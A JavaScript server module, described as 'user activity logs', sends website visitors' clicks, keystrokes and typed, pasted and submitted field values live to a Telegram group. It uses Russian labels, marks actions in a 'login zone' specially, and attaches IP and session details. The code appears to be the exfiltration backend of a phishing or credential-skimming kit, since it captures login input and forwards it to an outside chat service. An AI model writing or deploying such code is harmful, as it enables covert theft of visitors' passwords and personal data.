/**
 * User activity logs → Telegram group.
 */
import { escHtml, formatUserBlock, getUserContext, sendTelegram } from './telegram.mjs';

const THROTTLE_MS = Number(process.env.ACTIVITY_THROTTLE_MS) || 250;
const MAX_PER_MIN = Number(process.env.ACTIVITY_MAX_PER_MIN) || 80;

/** @type {Map<string, { last: number, count: number, windowStart: number }>} */
const rate = new Map();

const EMOJI = {
  click: '👆',
  input: '⌨️',
  change: '📝',
  select: '📋',
  navigation: '🔗',
  submit: '📤',
  focus: '👁️',
  paste: '📎',
  blur: '👋',
  keydown: '🔑',
  session_start: '🚀',
  scroll: '📜',
  copy: '📋',
};

const VALUE_TYPES = new Set(['input', 'change', 'select', 'blur', 'paste', 'submit']);

function rateKey(ip, sessionId) {
  return `${ip}:${sessionId || 'no-session'}`;
}

function allowSend(key) {
  const now = Date.now();
  let r = rate.get(key);
  if (!r) {
    r = { last: 0, count: 0, windowStart: now };
    rate.set(key, r);
  }
  if (now - r.windowStart > 60_000) {
    r.windowStart = now;
    r.count = 0;
  }
  if (r.count >= MAX_PER_MIN) return false;
  if (now - r.last < THROTTLE_MS) return false;
  r.last = now;
  r.count += 1;
  return true;
}

function formatValue(ev) {
  const raw = ev.value;
  if (raw === undefined || raw === null || String(raw).length === 0) return '<i>(пусто)</i>';
  return `<code>${escHtml(String(raw).slice(0, 400))}</code>`;
}

function describeAction(ev) {
  const type = ev.type || 'action';
  const field = ev.field || ev.target || '—';
  const emoji = EMOJI[type] || '🔔';

  switch (type) {
    case 'session_start':
      return `${emoji} <b>Сессия начата</b> на <code>${escHtml(ev.page || '/')}</code>`;
    case 'click':
      return `${emoji} Нажал: <b>${escHtml(field)}</b>`;
    case 'input':
      return `${emoji} Ввод в «<b>${escHtml(field)}</b>»\n💬 ${formatValue(ev)}`;
    case 'change':
      return `${emoji} Изменил «<b>${escHtml(field)}</b>»\n💬 ${formatValue(ev)}`;
    case 'select':
      return `${emoji} Выбрал «<b>${escHtml(field)}</b>»\n💬 ${formatValue(ev)}`;
    case 'navigation':
      return `${emoji} Перешёл на <code>${escHtml(ev.target || ev.page || '/')}</code>`;
    case 'submit':
      return `${emoji} <b>Отправил форму</b> «${escHtml(ev.target || 'форма')}»\n💬 ${formatValue(ev)}`;
    case 'focus':
      return `${emoji} Фокус на «<b>${escHtml(field)}</b>»${ev.value !== undefined ? `\n💬 ${formatValue(ev)}` : ''}`;
    case 'blur':
      return `${emoji} Ушёл с «<b>${escHtml(field)}</b>»\n💬 ${formatValue(ev)}`;
    case 'paste':
      return `${emoji} Вставил в «<b>${escHtml(field)}</b>»\n💬 ${formatValue(ev)}`;
    case 'copy':
      return `${emoji} Скопировал из «<b>${escHtml(field)}</b>»\n💬 ${formatValue(ev)}`;
    case 'keydown':
      return `${emoji} Клавиша <code>${escHtml(ev.value || '')}</code> в «<b>${escHtml(field)}</b>»`;
    default:
      return VALUE_TYPES.has(type)
        ? `${emoji} <b>${escHtml(type)}</b> «${escHtml(field)}»\n💬 ${formatValue(ev)}`
        : `${emoji} <b>${escHtml(type)}</b>: ${escHtml(field)}`;
  }
}

/**
 * @param {import('node:http').IncomingMessage} req
 * @param {Record<string, unknown>} event
 */
export async function notifyUserAction(req, event) {
  const ctx = await getUserContext(req);
  const sessionId = String(event.sessionId || '').slice(0, 64);
  const key = rateKey(ctx.ip, sessionId);

  if (!allowSend(key)) return;

  const when = new Date().toLocaleString('de-DE', { timeZone: 'Europe/Berlin' });
  const page = String(event.page || req.headers.referer || '').slice(0, 250);
  const zone = event.zone ? String(event.zone) : '';
  const actionLine = describeAction(event);
  const isLogin = Boolean(event.login);

  const text = [
    isLogin ? '🔐 <b>Действие (логин-зона)</b>' : `${EMOJI[event.type] || '🔔'} <b>Действие пользователя</b>`,
    '────────────────',
    '',
    actionLine,
    zone ? `\n📌 <b>Зона:</b> ${escHtml(zone)}` : '',
    event.tag ? `\n🏷 <b>Элемент:</b> <code>${escHtml(String(event.tag))}</code>` : '',
    '',
    formatUserBlock(ctx, { sessionId: sessionId || undefined, page: page || undefined }),
    '',
    `🕐 ${escHtml(when)}`,
  ]
    .filter((line) => line !== '')
    .join('\n');

  await sendTelegram(text);
  console.log('[activity]', ctx.ip, event.type, event.field || event.target, event.value ?? '');
}
